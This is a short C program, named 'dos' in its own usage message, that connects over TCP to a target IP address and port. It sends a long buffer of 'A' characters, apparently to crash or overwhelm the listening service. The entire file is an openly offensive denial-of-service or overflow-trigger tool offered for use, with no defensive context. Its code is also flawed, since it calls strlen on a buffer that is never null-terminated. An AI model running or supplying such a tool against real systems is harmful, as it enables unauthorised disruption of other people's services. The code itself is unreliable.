#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>

int main(int argc, char *argv[])
{
  int sd;
  int i;
  int nbytes;
  char *buf;
  struct sockaddr_in servaddr;

  if (argc != 4) {
    printf("Usage : dos <ip> <port> <number of bytes>\n\n");
    exit(-1);
  }
  
  nbytes = atoi(argv[3]);
  buf = (char*)malloc(nbytes);

  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = inet_addr(argv[1]);
  servaddr.sin_port = htons(atoi(argv[2]));

  if ( (sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket() failed");
    exit(-1);
  }

  memset(buf, 'A', nbytes);

  if (connect(sd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
    perror("connect() failed");
    exit(-1);
  }

  send(sd, buf, strlen(buf), 0);
  
  free(buf);  
  close(sd);
}
